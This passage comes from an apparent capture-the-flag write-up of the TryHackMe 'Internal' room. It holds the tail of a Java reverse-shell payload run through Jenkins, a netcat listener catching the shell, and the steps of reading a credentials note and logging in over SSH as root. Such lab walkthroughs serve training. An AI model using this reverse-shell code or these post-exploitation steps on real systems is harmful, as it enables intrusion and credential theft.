style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span>0<span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span>0<span style="color:#f92672">)</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>po<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">(</span>50<span style="color:#f92672">);</span><span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">exitValue</span><span style="color:#f92672">();</span><span style="color:#66d9ef">break</span><span style="color:#f92672">;}</span><span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}};</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">destroy</span><span style="color:#f92672">();</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ nc -nlvp <span style="color:#ae81ff">1337</span>                                                                                                                                  ─╯
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+connect to <span style="color:#f92672">[</span>10.9.1.222<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.170.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">53972</span>
+id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>jenkins<span style="color:#f92672">)</span>
+whoami
+jenkins
+cd /opt
+ls -la
+total <span style="color:#ae81ff">12</span>
+drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> ..
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">204</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them <span style="color:#66d9ef">if</span> you 
+need access to the root user account.
+
+root:<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
+root@internal.thm<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-112-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jul  <span style="color:#ae81ff">9</span> 09:52:03 UTC <span style="color:#ae81ff">2021</span>
+
+  System load:  0.0               Processes:              <span style="color:#ae81ff">111</span>
+  Usage of /:   63.9% of 8.79GB   Users logged in:        <span style="color:#ae81ff">0</span>
+  Memory usage: 57%               IP address <span style="color:#66d9ef">for</span> eth0:    10.10.170.6
+  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
+
+  <span style="color:#f92672">=</span>&gt; There is <span style="color:#ae81ff">1</span> zombie process.
+
+
+ * Canonical Livepatch is available <span style="color:#66d9ef">for</span> installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+<span style="color:#ae81ff">0</span> packages can be updated.
+<span style="color:#ae81ff">0</span> updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Aug  <span style="color:#ae81ff">3</span> 19:59:17 <span style="color:#ae81ff">2020</span> from 10.6.2.56
+root@internal:~# cat root.txt 
+<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/blueprint/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Blueprint - Write Up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/thm-pre-security/">
+                  <span class="button__text">Hack Your Way To Learn - THM</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Lanfran02</div>
+      
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3T7DYCWC0W', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
